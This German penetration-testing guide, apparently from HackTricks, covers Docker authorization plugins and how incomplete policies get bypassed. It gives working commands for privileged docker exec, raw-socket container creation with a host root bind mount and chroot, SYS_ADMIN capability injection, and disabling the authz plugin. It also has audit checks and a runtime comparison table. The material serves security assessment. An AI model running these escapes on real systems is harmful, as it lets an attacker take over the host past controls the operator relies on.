# Runtime-Autorisierungs-Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Runtime-Autorisierungs-Plugins bilden eine zusätzliche Richtlinienebene, die entscheidet, ob ein Aufrufer eine bestimmte Daemon-Aktion ausführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker-Daemon kommunizieren kann, praktisch weitreichende Kontrolle über ihn. Autorisierungs-Plugins versuchen, dieses Modell einzuschränken, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage dann gemäß der Richtlinie zulassen oder ablehnen.

Dieses Thema verdient eine eigene Seite, weil es das Exploit-Modell verändert, wenn ein Angreifer bereits Zugriff auf eine Docker-API oder auf einen Benutzer in der Gruppe `docker` hat. In solchen Umgebungen lautet die Frage nicht mehr nur „Kann ich den Daemon erreichen?“, sondern auch „Ist der Daemon durch eine Autorisierungsebene abgesichert, und falls ja: Lässt sich diese Ebene über nicht behandelte Endpunkte, schwaches JSON-Parsing oder Berechtigungen zur Plugin-Verwaltung umgehen?“

## Funktionsweise

Erreicht eine Anfrage den Docker-Daemon, kann das Autorisierungssystem den Anfragekontext an ein oder mehrere installierte Plugins weitergeben. Das Plugin sieht die Identität des authentifizierten Benutzers, die Anfragedetails, ausgewählte Header sowie Teile des Anfrage- oder Antwort-Bodys, sofern der Content-Type dafür geeignet ist. Mehrere Plugins können verkettet werden, und Zugriff wird nur gewährt, wenn alle Plugins die Anfrage zulassen.

Dieses Modell klingt sicher, doch seine Sicherheit hängt vollständig davon ab, wie umfassend der Richtlinienautor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie `Binds` auf oberster Ebene übersieht oder die Plugin-Verwaltung zulässt, kann ein falsches Gefühl der Einschränkung erzeugen und dennoch direkte Wege zur Rechteausweitung offenlassen.

## Häufige Plugin-Ziele

Wichtige Bereiche für die Richtlinienprüfung sind:

- Endpunkte zur Containererstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Optionen zur gemeinsamen Nutzung von Namespaces
- das Verhalten von `docker exec`
- Endpunkte zur Plugin-Verwaltung
- alle Endpunkte, die indirekt Laufzeitaktionen außerhalb des vorgesehenen Richtlinienmodells auslösen können

Historisch machten Beispiele wie das `authz`-Plugin von Twistlock und einfache Lehr-Plugins wie `authobot` dieses Modell leicht nachvollziehbar, da ihre Richtliniendateien und Codepfade zeigten, wie die Zuordnung von Endpunkten zu Aktionen tatsächlich implementiert wurde. Für Assessments ist die entscheidende Erkenntnis, dass der Richtlinienautor die gesamte API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Missbrauch

Zunächst sollte ermittelt werden, was tatsächlich blockiert wird. Lehnt der Daemon eine Aktion ab, leakt die Fehlermeldung oft den Plugin-Namen, was dabei hilft, die eingesetzte Kontrolle zu identifizieren:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Wenn du ein umfassenderes Endpoint-Profiling benötigst, sind Tools wie `docker_auth_profiler` nützlich, da sie die ansonsten repetitive Aufgabe automatisieren, zu prüfen, welche API-Routen und JSON-Strukturen das Plugin tatsächlich zulässt.

Wenn die Umgebung ein benutzerdefiniertes Plugin verwendet und du mit der API interagieren kannst, ermittle, welche Objektfelder tatsächlich gefiltert werden:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler feldspezifisch und nicht konzeptspezifisch sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die entsprechende API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Container-Erstellung zusätzliche Berechtigungen hinzu

Eine Richtlinie, die die Erstellung privilegierter Container blockiert, aber die Erstellung nicht eingeschränkter Container plus `docker exec` erlaubt, lässt sich möglicherweise trotzdem umgehen:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Wenn der Daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers erlangt, den der Richtlinienautor für eingeschränkt hielt.

Eine eingeschränkte `sudo`-Regel kann denselben Weg eröffnen, selbst wenn der Aufrufer nicht direkt auf den Docker-Socket zugreifen kann. Beispielsweise kann eine root-berechtigte Freigabe für `/usr/bin/docker exec *` dem Aufrufer erlauben, Dockers Optionen `--privileged` und `--user root` anzugeben. Ein laufender Container ist weiterhin erforderlich; auf manchen Linux-Hosts ist seine ID in der Befehlszeile eines `containerd-shim`-Prozesses sichtbar, wenn `docker ps` verweigert wird. Betrachten Sie die Regel als Prüfhinweis: Überprüfen Sie die effektive sudo-Richtlinie, die Autorisierungskontrollen des Daemons, User-Namespaces und ob der resultierende Prozess auf ein Hostgerät oder ein beschreibbares Host-Mount zugreifen kann. Docker dokumentiert die `exec`-Optionen in seiner [CLI-Referenz](https://docs.docker.com/reference/cli/docker/container/exec/).

Ein als root ausgeführter Wrapper, der eine vom Aufrufer gewählte Compose-Datei akzeptiert, muss das gesamte [Compose-Service-Modell](https://docs.docker.com/reference/compose-file/services/) validieren und darf nicht nur `privileged: true` zurückweisen und `:ro` für Bind-Mounts verlangen. Prüfen Sie `cap_add`, `security_opt`, Geräte, Namespaces, Build-Eingaben und alle unterstützten Volume-Syntaxen. Ein schreibgeschütztes Bind-Mount kann aus einem Container mit geeigneten Capabilities und gelockerter Sicherheitsbeschränkung dennoch beschreibbar werden, abhängig von den Richtlinien des Daemons und des Kernels. Auch Host-Pfad-Allowlisten, die nur Präfixe prüfen, sowie Symlink-Prüfungen an der letzten Pfadkomponente müssen überprüft werden. Eine sudo-Regel und ein wörtlicher Aufruf von `docker-compose up` identifizieren einen möglichen Ansatzpunkt; ob er ausnutzbar ist, hängt von der effektiven Validierung des Wrappers und den Laufzeitbeschränkungen des Daemons ab.

### Vollständiges Beispiel: Bind-Mount über die Raw API

Manche fehlerhaften Richtlinien prüfen nur eine JSON-Struktur. Wenn das Root-Dateisystem-Bind-Mount nicht durchgängig blockiert wird, lässt sich der Host dennoch mounten:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Dieselbe Idee kann auch unter `HostConfig` auftauchen:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Die Auswirkungen bestehen in einem vollständigen Ausbruch aus dem Host-Dateisystem. Interessant ist, dass der Bypass auf einer unvollständigen Policy-Abdeckung und nicht auf einem Kernel-Bug beruht.

### Vollständiges Beispiel: Nicht überprüftes Capability-Attribut

Wenn die Policy vergisst, ein Capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability zurückerlangt:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebene Breakout-Techniken zugänglich.

### Vollständiges Beispiel: Plugin deaktivieren

Wenn Plugin-Verwaltungsoperationen erlaubt sind, besteht der sauberste Bypass möglicherweise darin, die Kontrolle vollständig auszuschalten:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Dies ist ein Richtlinienfehler auf Control-Plane-Ebene. Die Autorisierungsschicht ist vorhanden, aber der Benutzer, dessen Berechtigungen sie einschränken sollte, kann sie weiterhin deaktivieren.

## Prüfungen

Mit diesen Befehlen lässt sich feststellen, ob eine Richtlinienschicht vorhanden ist und ob sie vollständig oder nur oberflächlich umgesetzt zu sein scheint.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Was hier interessant ist:

- Ablehnungsmeldungen, die einen Plugin-Namen enthalten, bestätigen eine Autorisierungsschicht und verraten oft die genaue Implementierung.
- Eine für den Angreifer sichtbare Plugin-Liste kann ausreichen, um herauszufinden, ob Deaktivierungs- oder Neukonfigurationsvorgänge möglich sind.
- Eine Richtlinie, die nur offensichtliche CLI-Aktionen blockiert, nicht aber rohe API-Anfragen, sollte als umgehbar gelten, bis das Gegenteil bewiesen ist.

## Laufzeitstandards

| Laufzeit / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig nicht aktiviert | Der Zugriff auf den Daemon ist im Wesentlichen Alles-oder-nichts, sofern kein Autorisierungs-Plugin konfiguriert ist | unvollständige Plugin-Richtlinie, Blacklists statt Allowlists, Zulassen der Plugin-Verwaltung, blinde Flecken auf Feldebene |
| Podman | Kein gängiges direktes Äquivalent | Podman stützt sich typischerweise stärker auf Unix-Berechtigungen, rootless-Ausführung und Entscheidungen zur API-Exposition als auf Docker-artige Authz-Plugins | breite Freigabe einer rootful-Podman-API, schwache Socket-Berechtigungen |
| containerd / CRI-O | Anderes Kontrollmodell | Diese Laufzeiten stützen sich üblicherweise auf Socket-Berechtigungen, Vertrauensgrenzen von Nodes und Kontrollen auf höherer Orchestrierungsebene statt auf Docker-Authz-Plugins | Einbinden des Sockets in Workloads, schwache node-lokale Vertrauensannahmen |
| Kubernetes | Verwendet Authentifizierung/Autorisierung auf API-Server- und Kubelet-Ebene, keine Docker-Authz-Plugins | Cluster-RBAC und Admission Controls sind die zentrale Richtlinienebene | zu weit gefasstes RBAC, schwache Admission-Richtlinien, direkte Freigabe von Kubelet- oder Runtime-APIs |

{{#include ../../../banners/hacktricks-training.md}}
